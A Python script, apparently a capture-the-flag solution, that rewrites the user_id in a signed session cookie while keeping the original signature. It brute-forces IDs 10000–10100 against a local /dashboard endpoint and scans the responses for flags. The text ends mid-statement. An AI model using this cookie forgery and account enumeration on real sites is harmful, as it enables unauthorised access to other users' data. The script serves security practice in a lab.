import requests
import base64
import json
import re

# Original session cookie structure
# session=eyJ1c2VyX2lkIjoiMTAwMzIifQ.aVd0oA.VqPUgS4MLdLZbrF9JRNetU8FfwI
# payload: eyJ1c2VyX2lkIjoiMTAwMzIifQ -> {"user_id":"10032"}
# timestamp: aVd0oA
# signature: VqPUgS4MLdLZbrF9JRNetU8FfwI

original_cookie = "eyJ1c2VyX2lkIjoiMTAwMzIifQ.aVd0oA.VqPUgS4MLdLZbrF9JRNetU8FfwI"
timestamp_signature = ".aVd0oA.VqPUgS4MLdLZbrF9JRNetU8FfwI"

base_url = "http://127.0.0.1:33187"
endpoint = "/dashboard"

successful_ids = []
all_responses = {}

print("[*] Starting session cookie brute force for user_id values 10000-10100")
print(f"[*] Testing against {base_url}{endpoint}")
print("[*] Original user_id: 10032\n")

# Test each user_id from 10000 to 10100
for user_id in range(10000, 10101):
    # Create modified payload
    payload_dict = {"user_id": str(user_id)}
    payload_json = json.dumps(payload_dict, separators=(',', ':'))
    
    # Base64 encode the payload (without padding)
    encoded_payload = base64.b64encode(payload_json.encode()).decode().rstrip('=')
    
    # Construct the modified cookie
    modified_cookie = encoded_payload + timestamp_signature
    
    try:
        # Test the cookie
        response = requests.get(
            f"{base_url}{endpoint}", 
            cookies={'session': modified_cookie},
            timeout=10
        )
        
        # Store response details
        content_length = len(response.content)
        status_code = response.status_code
        
        # Check for flags in response
        flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
        
        # Determine if this is a "successful" access
        # (different from typical failure response)
        is_success = False
        if status_code == 200:
            # Check if response contains meaningful content (not just error)
            if "error" not in response.text.lower() and "not found" not in response.text.lower():
                is_success = True
        elif status_code != 404 and status_code != 403:
            # Any non-standard error code might indicate something interesting
            is_success = True
        
        if is_success:
            successful_ids.append({
                'user_id': user_id,
                'status_code': status_code,
                'content_length': content_length,
                'flags': flag_matches
            })
            print(f"[!] SUCCESS: user_id={user_id}")
            print(f"    Status: {status_code} | Length: {content_length}B")
            if flag_matches:
                print(f"    FLAGS: {flag_matches}")
            print(f"    Response preview: {response.text[:200]}...")
            print()
        
        # Store all responses for analysis
        all_responses[user_id] = {
            'status_code': status_code,
            'content_length': content_length,
            'flags': flag_matches
        }
        
        # Rate limiting - small delay
        if user_id % 10 == 0:
            print(f"[*] Progress: Tested {user_id - 10000}/101 user IDs")
            
    except Exception as e:
        print(f"[!] Error testing user_id {user_id}: {str(e)}")

# Summary
print("\n[*]" + "="*60)
print("[*] BRUTE FORCE COMPLETE")
print("[*]" + "="*60)
print(f"[*] Total successful accesses: {len(successful_ids)}")
print(f"[*] User IDs with different responses:")

for success in successful_ids:
    print(f"    - user_id: {success['user_id']} (Status: {success['status_code']}, Size: {success['content_length']}B)")
    if success['flags']:
        for flag in success['flags']:
            print(f"      FLAG FOUND: {flag}")

print("\n[*] Detailed response analysis:")
# Look for patterns in responses
status_codes = {}
content_lengths = {}

for user_id, data in all_responses.items():
    status = data['status_code']
    length = data['content_length']
    
    status_codes[status] = status_codes.get(status, 0) + 1
    content_lengths[length] = content_lengths.get(length, 0) + 1

print(f"    Status code distribution: {dict(status_codes)}")
print(f"    Content length distribution (unique lengths): {len(content_lengths)}")

# If we found different content lengths, show which user_ids have them
if len(content_lengths) > 1:
    print("\n[*] User IDs with unique response sizes:")
    for length, count in sorted(content_lengths.items()):
        if count < 5:  # Show only uncommon sizes
            user_ids_with_length = [uid for uid, data in all_responses.items() if data['content_length'] == length]
            print(f"    Length {length}B: {user_ids_with_length}")

# Check for any flags across all responses
all_flags = []
for success in successful_ids:
    all_flags.extend(success['flags'])

if all_flags:
    print(f"\n[!] TOTAL FLAGS FOUND: {len(all_flags)}")
    for flag in all_flags:
        print(f"    {flag}")
else:
